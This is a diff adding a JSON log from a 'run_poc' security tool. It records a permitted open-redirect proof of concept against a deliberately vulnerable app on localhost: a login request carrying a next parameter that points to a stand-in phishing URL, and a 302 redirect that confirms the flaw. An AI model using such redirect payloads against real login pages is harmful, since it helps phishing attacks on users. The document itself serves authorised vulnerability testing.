@@ -1,0 +1,51 @@
+{
+  "tool": "run_poc",
+  "version": "1.0.0",
+  "finding": "F-9",
+  "poc_file": "open-redirect-login.json",
+  "target": "http://127.0.0.1:5057",
+  "permission": "Example run: the skill's author started the deliberately vulnerable sample app on 127.0.0.1:5057 for this run and allowed safe PoCs against it",
+  "allow_hosts": [],
+  "started_at": "2026-11-10T04:26:50Z",
+  "finished_at": "2026-11-10T04:26:51Z",
+  "safety": {
+    "checked": true,
+    "issues": []
+  },
+  "steps": [
+    {
+      "name": "login with next",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:5057/login?next=https%3A%2F%2Fcanary.example%2Fphish",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "email=alice%40example.test&password=alice-test-pw"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "243",
+          "Location": "https://canary.example/phish",
+          "Set-Cookie": "session=<redacted>; HttpOnly; Path=/"
+        },
+        "body_excerpt": "<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href=\"https://canary.example/phish\">https://canary.example/phish</a>. If not, click the link.\n",
+        "body_length": 243,
+        "elapsed_ms": 404
+      },
+      "expect_status_met": null
+    }
+  ],
+  "proof": {
+    "type": "header_matches",
+    "step": "login with next",
+    "header": "Location",
+    "pattern": "^https://canary\\.example/",
+    "passed": true,
+    "observed": "Location: 'https://canary.example/phish' matches '^https://canary\\\\.example/'"
+  },
+  "result": "confirmed"
+}
